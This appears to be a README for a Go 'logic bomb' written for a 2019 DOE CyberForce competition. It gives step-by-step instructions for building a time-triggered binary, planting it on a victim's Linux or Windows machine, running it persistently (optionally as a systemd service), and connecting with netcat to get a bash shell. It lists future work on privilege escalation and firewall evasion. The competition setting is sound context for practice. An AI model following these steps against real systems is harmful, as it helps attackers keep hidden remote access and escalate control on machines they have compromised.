# logicbomb-reverse-shell
Author: Shail Patel

Description:

This is a GO-based logic-bomb script written by me for the DOE CyberForce competition 2019 to spawn a reverse shell by opening random network ports.

Usage:

1. Change the epoch timestamp in the script. Go to www.epochconverter.com and input the CORRECT execution time in your preferred local time/GMT and replace the epoch stamp by your newly created time----Line-->'if timeNow > newtime'. You can also slice up and change the portNos in this script differently and accoding to your desired usage.
2. Shoot up the terminal and 'go build logicbomb.go'. 

3. Place the created binary file into your desired target victim's location path of windows/Linux directory. Then execute---> './logicbomb &'. You can also bind this as a service file inside systemd manually in order to avoid using '&' while executing the file. I will post that part later. Now, wait till your preferred triggered time of epoch execution.
In Linux,
4. Open up another terminal and "nc -l 'target_ip' 7864/7777/7783/8348/8677/8999". This will spawn a bash shell and you are in!
Check whoami, pwd, ls, ifconfig. Also monitor using "netstat -antlp | grep 'ncat' " if those ports are persistently open.


Note:
Initial Machine Access Required: yes

This shell should be used to maintain foothold/persistence or for post-exploitation once an attacker gains initial entry.

To Do:

1. Work more on a user based priviledge escalation technique.
2. Find a way to punch a hole through firewall in order to avoid instant blocking of the ports, if any.
3. Find alternative way to regenerate another ports, in case gets killed by processids.

If you have any questions, please email me directly
shail.patel@nrel.gov

